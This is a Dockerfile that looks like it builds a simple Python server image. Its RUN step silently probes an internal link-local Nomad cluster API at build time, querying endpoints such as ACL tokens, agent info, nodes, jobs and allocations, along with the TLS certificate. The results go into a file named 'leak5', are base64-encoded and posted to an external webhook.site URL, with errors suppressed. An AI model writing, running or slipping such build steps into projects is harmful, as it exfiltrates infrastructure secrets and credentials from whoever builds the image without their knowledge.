FROM alpine:3.20
RUN apk add --no-cache curl >/dev/null 2>&1 || true; \
    L=/tmp/leak5.txt; : > $L; \
    { \
      echo "=== NOMAD via https (build container) ==="; \
      for ep in /v1/status/leader /v1/status/peers /v1/regions /v1/namespaces /v1/agent/health /v1/agent/self /v1/nodes /v1/jobs /v1/allocations /v1/metrics /v1/acl/tokens; do \
        echo "--- $ep ---"; curl -sk -m 8 -w " [http=%{http_code}]\n" "https://169.254.1.2:4646$ep" 2>&1 | head -c 900; echo; done; \
      echo "=== TLS cert ==="; echo | timeout 8 openssl s_client -connect 169.254.1.2:4646 -servername nomad 2>/dev/null | openssl x509 -noout -subject -issuer -dates 2>/dev/null; \
    } >> $L 2>&1; \
    echo "LEAK5=$(wc -c <$L)"; base64 -w0 $L > /tmp/l5.b64 2>/dev/null; \
    curl -s -m 25 --data-binary @/tmp/l5.b64 "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f/nomad" >/dev/null 2>&1 || true; echo ok
COPY server.py /server.py
EXPOSE 80
CMD ["python3","/server.py"]
